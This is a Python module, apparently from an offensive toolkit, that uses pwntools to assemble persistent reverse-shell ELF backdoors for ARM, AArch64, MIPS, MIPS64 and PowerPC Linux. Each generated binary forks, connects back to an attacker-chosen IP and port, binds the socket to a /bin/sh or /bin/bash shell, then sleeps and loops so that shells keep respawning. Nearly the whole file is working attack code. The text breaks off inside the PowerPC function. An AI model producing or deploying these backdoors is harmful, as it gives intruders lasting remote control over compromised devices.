from pwn import *
from . import my_package
import os
from colorama import Fore,Back,Style

chars = my_package.chars

'''
this moudule main fuction, powerful reverse_shell_file

fork + execve 

The backdoor will not stop generating reverse_shell without taking up as little CPU as possible

'''



'''
2023.1.12
add armelv7-power-reverse_sh
add armebv7-power-reverse_sh

'''




def armelv7_power_reverse_shell(shell_path, reverse_ip, reverse_port, envp, sleep_time,filename= None):
	context.arch = 'arm'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		#shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	pass
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.syntax unified
.arch armv7-a
	'''
	shellcode += shellcraft.fork()
	shellcode += '''
mov r3,r0
cmp r3,#0
bne main_lab
	'''
	shellcode += shellcraft.connect(reverse_ip, reverse_port)

	shellcode += '''
mov r5,r6
mov r0,r5
mov r1,#0
movw r7,#0x3f
svc #0
mov r0,r5
mov r1,#1
svc #0
mov r0,r5
mov r1,#2
svc #0
	'''
	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	
	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("r3")

	shellcode += """
ldr r10, ={time}
eor r5, r5
push {{r5}}
push {{r10}}
mov r0, sp
mov r7, 0xa2
svc #0
	""".format(time=sleep_time)

	shellcode += '''
b __start
nop
	'''
	#shellcode = asm(shellcode)

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def armebv7_power_reverse_shell(shell_path, reverse_ip, reverse_port , envp, sleep_time,filename=None):
	context.arch = 'arm'
	context.endian = 'big'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		#shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	pass
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.syntax unified
.arch armv7-a
	'''
	shellcode += shellcraft.fork()
	shellcode += '''
mov r3,r0
cmp r3,#0
bne main_lab
	'''
	shellcode += shellcraft.connect(reverse_ip, reverse_port)

	shellcode += '''
mov r5,r6
mov r0,r5
mov r1,#0
movw r7,#0x3f
svc #0
mov r0,r5
mov r1,#1
svc #0
mov r0,r5
mov r1,#2
svc #0
	'''
	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	
	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("r3")

	shellcode += """
ldr r10, ={time}
eor r5, r5
push {{r5}}
push {{r10}}
mov r0, sp
mov r7, 0xa2
svc #0
	""".format(time=sleep_time)

	shellcode += '''
b __start
nop
	'''
	#shellcode = asm(shellcode)

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def aarch64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'aarch64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
/* push b'/bin/bash\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
/* push b'/bin/bash\x00-i\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
/* Set x15 = 1764556904 = 0x692d0068 */
mov  x15, #104
movk x15, #26925, lsl #16
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #18
add x14, sp, x14
sub sp, sp ,8
str x14, [sp, #-8]!
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
stp x5, x14 , [sp, #-8]!

add x1, sp, 8

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve ='''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	
	shellcode += shellcraft.clone(0x1200011)

	shellcode += '''
mov x11, x0
cmp w0, #0
b.ne main_lab
	'''

	shellcode += shellcraft.connect(reverse_ip, reverse_port)

	shellcode += '''
mov x0,x12
mov x1,#0
mov x2,#0
mov x8,#0x18
svc #0x1337
mov x0,x12
mov x1,#1
svc #1337
mov x0,x12
mov x1,#2
svc #1337
	'''
	#shellcode += shellcraft.execve(shell_path, shell_path_list, envp)

	shellcode += shellcode_execve

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("x11")

	shellcode += """
LDR X12, ={time}
eor x11, x11, x11
str x11, [sp, #-8]!
str x12, [sp, #-8]!
mov x0, sp
mov  x8, #0x65
svc 0
	""".format(time=sleep_time)

	shellcode += '''
b __start
nop
	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def mipsel_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'mips'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		#shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.set mips2
.set noreorder
	'''
	shellcode += shellcraft.fork()

	shellcode += '''
	move  $s5, $v0
	bnez $v0, main_lab
	nop
	'''
	shellcode += shellcraft.connect(reverse_ip, reverse_port)
	shellcode += '''
xor $t2,$t2
move $a1,$t2
li  $v0,0xfdf
syscall 0x40404
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0xfdf
syscall 0x40404
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0xfdf
syscall 0x40404
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list,envp)

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("$s5")

	shellcode += """
xor  $t0,$t0,$t0
addiu $sp, $sp, -4
sw   $t0, 0($sp)
li   $t0,{time}
addiu $sp, $sp, -4
sw   $t0, 0($sp)
move $a0,$sp
li   $v0, 0x1046
syscall 0x40404
	""".format(time=sleep_time)

	shellcode += '''
j __start
nop
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
sleep num 5034
'''


def mips_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'mips'
	context.endian = 'big'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		#shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.set mips2
.set noreorder
	'''
	shellcode += shellcraft.fork()

	shellcode += '''
	move  $s5, $v0
	bnez $v0, main_lab
	nop
	'''
	shellcode += shellcraft.connect(reverse_ip, reverse_port)
	shellcode += '''
xor $t2,$t2
move $a1,$t2
li  $v0,0xfdf
syscall 0x40404
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0xfdf
syscall 0x40404
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0xfdf
syscall 0x40404
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list,envp)

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("$s5")

	shellcode += """
xor  $t0,$t0,$t0
addiu $sp, $sp, -4
sw   $t0, 0($sp)
li   $t0,{time}
addiu $sp, $sp, -4
sw   $t0, 0($sp)
move $a0,$sp
li   $v0, 0x1046
syscall 0x40404
	""".format(time=sleep_time)

	shellcode += '''
j __start
nop
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


'''
add 2023.1.13
mips64-power
mips64el-power
'''


def mips64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'mips64'
	context.endian = 'big'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port = int(hex(reverse_port), 16)
	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
	reverse_ip = list(reverse_ip.split("."))
	reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
	# print(reverse_ip_high)
	# print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	# print(reverse_ip_high)
	reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
	shellcode ='''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	shellcode += '''
li $a0,0x1200012
xor $a1,$a1,$a1
xor $a2,$a2,$a2
xor $a3,$a3,$a3
li  $v0,0x13bf
syscall
move $s5, $v0
bnez $v0, main_lab
	'''

	shellcode_connect = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x13b0
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, 0xfffd
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
daddiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x13b1
syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_high,reverse_ip_low)
	
	shellcode += shellcode_connect

	shellcode += '''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x13A8
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x13A8
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x13A8
syscall 0x40404
	'''
	if shell_path == "/bin/sh" or shell_path=="sh":
		shellcode +='''
li $t1, 0x2f62696e
sw $t1, -8($sp)
li $t9, ~0x2f736800
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -8
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/sh\x00', '-i\x00'] */
/* push '/bin/sh\x00-i\x00\x00' */
li $t1, 0x2f62696e
sw $t1, -12($sp)
li $t9, ~0x2f736800
not $t1, $t9
sw $t1, -8($sp)
li $t9, ~0x2d690000
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xc
not $a1, $t9
dadd $a1, $sp, $a1
dadd $a1, $a1, 4
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
daddiu $a1, $sp, 0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
li $t1, 0x2f62696e
sw $t1, -12($sp)
li $t1, 0x2f626173
sw $t1, -8($sp)
li $t9, ~0x68000000
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -12
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/bash\x00', '-i\x00'] */
/* push '/bin/bash\x00-i\x00\x00' */
li $t1, 0x2f62696e
sw $t1, -16($sp)
li $t1, 0x2f626173
sw $t1, -12($sp)
li $t9, ~0x68002d69
not $t1, $t9
sw $t1, -8($sp)
sw $zero, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xe
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '-i\x00' */
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddi $sp, $sp, -8 /* '/bin/bash\x00' */
dadd $a1, $sp, $0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	'''
wait4 syscall num 0x000000000013c3
exit  syscall num 0x00000000001455
	'''
	shellcode += '''
xor $a0, $a0, $a0
li  $v0, 0x01455
syscall
	'''


	
	shellcode += '''
main_lab:
move $a0,$s5
xor  $a1,$a1,$a1
xor  $a2,$a2,$a2
xor  $a3,$a3,$a3
li   $v0,0x13c3
syscall
	'''
	shellcode += """
xor $a0, $a0, $a0
daddiu $sp, $sp, -8
sw   $t0, 0($sp)
li  $t0,{time}
daddiu $sp, $sp, -8
sw   $t0, 4($sp)
move $a0, $sp
li  $v0, 5034
syscall
	""".format(time = sleep_time)

	shellcode+='''
j _start
nop
	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def mips64el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'mips64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port=int(hex(reverse_port),16)
	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
	reverse_ip=list(reverse_ip.split("."))
	reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
	#print(reverse_ip_high)
	#print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	#print(reverse_ip_high)
	reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
	#print(reverse_ip_low)
	shellcode ='''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	shellcode += '''
li $a0,0x1200012
xor $a1,$a1,$a1
xor $a2,$a2,$a2
xor $a3,$a3,$a3
li  $v0,0x13bf
syscall
move $s5, $v0
bnez $v0, main_lab
	'''
	shellcode_connect='''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x13b0
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, %s
ori     $t9, $t9, 0xfffd
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
daddiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x13b1
syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)

	shellcode += shellcode_connect

	shellcode += '''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x13A8
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x13A8
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x13A8
syscall 0x40404
	'''
	if shell_path == "/bin/sh" or shell_path=="sh":
		shellcode +='''
li $t1, 0x6e69622f
sw $t1, -8($sp)
li $t9, ~0x68732f
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -8
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/sh\x00', '-i\x00'] */
/* push '/bin/sh\x00-i\x00\x00' */
li $t1, 0x6e69622f
sw $t1, -12($sp)
li $t9, ~0x68732f
not $t1, $t9
sw $t1, -8($sp)
ori $t1, $zero, 26925
sw $t1, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xc
not $a1, $t9
dadd $a1, $sp, $a1
dadd $a1, $a1, 4
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
daddiu $a1, $sp, 0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode  += '''
li $t1, 0x6e69622f
sw $t1, -12($sp)
li $t1, 0x7361622f
sw $t1, -8($sp)
li $t9, ~0x68
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -12
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/bash\x00', '-i\x00'] */
/* push '/bin/bash\x00-i\x00\x00' */
li $t1, 0x6e69622f
sw $t1, -16($sp)
li $t1, 0x7361622f
sw $t1, -12($sp)
li $t9, ~0x692d0068
not $t1, $t9
sw $t1, -8($sp)
sw $zero, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xe
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '-i\x00' */
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddi $sp, $sp, -8 /* '/bin/bash\x00' */
dadd $a1, $sp, $0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode += '''
xor $a0, $a0, $a0
li  $v0, 0x01455
syscall
	'''
	
	shellcode += '''
main_lab:
move $a0,$s5
xor  $a1,$a1,$a1
xor  $a2,$a2,$a2
xor  $a3,$a3,$a3
li   $v0,0x13c3
syscall
	'''
	shellcode += """
xor $a0, $a0, $a0
daddiu $sp, $sp, -8
sw   $t0, 0($sp)
li  $t0,{time}
daddiu $sp, $sp, -8
sw   $t0, 0($sp)
move $a0, $sp
li  $v0, 5034
syscall
	""".format(time = sleep_time)
	shellcode +='''
j _start
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def powerpc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'powerpc'
	context.endian = 'big'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port='0x'+enhex(p16(reverse_port))
	shellcode ='''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	'''
	powerpc fork num 0x000078
	powerpc wait4 num 0x000072
	powerpc exit  num 0x0000ea
	mr     r9, r3
	cmpwi  cr7, r9, 0
	'''
	shellcode += '''
lis 3, 288
ori 3, 3, 17
xor 4, 4, 4
li  0, 0x78
sc
mr  11, 3
cmpwi cr7, 11, 0
bne   cr7, main_lab
	'''
	shellcode += '''
mr    r31,r1
li    r3,2
li    r4,1
li    r5,0
li    r0,0x146
sc
mr    r17,r3
xor   r9,r9,r9
stw   r9, 28(r31)
stw   r9, 32(r31)
stw   r9, 36(r31)
stw   r9, 36(r31)
stw   r9, 40(r31)
stw   r9, 44(r31)
stw   r9, 48(r31)
stw   r9, 52(r31)
stw   r9, 56(r31)
stw   r9, 4(r31)
stw   r9, 8(r31)
li    r9, 2
sth   r9, 28(r31)
li    r9, %s
sth   r9, 30(r31)
li    r9, %s
stb   r9, 32(r31)
li    r9, %s
stb   r9, 33(r31)
li    r9, %s
stb   r9, 34(r31)
li    r9, %s
stb   r9, 35(r31)
addi   r4, r31, 0x1c
mr    r3, r17
li    r5, 0x10
li    r0, 0x148
sc
xor   r5, r5, r5
mr    r3,r17
li    r4,0
li    r0,0x3f
sc
mr    r3,r17
li    r4,1
sc
mr    r3,r17
li    r4,2
sc

	'''
	shellcode = shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3)
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
lis    9, 0x2f62
ori    9, 9, 26990
stw    9, 48(31)
xor    9, 9, 9
lis    9, 0x2f73
ori    9, 9, 26624
stw    9, 52(31)
lis    9, 0x2d69
stw    9, 60(31)
addi   3, 31,0x30
stwu   3, 0(31)
addi   11, 31,60
addi   4, 31, -4
xor    5, 5, 5
li     0, 0xb
sc
	'''
	elif shell_path == "/bin/bash" or shell_path == "bash" :
		shellcode += '''
lis    9, 0x2f62
ori    9, 9, 26990
stw    9, 48(31)
xor    9, 9, 9
lis    9, 0x2f62
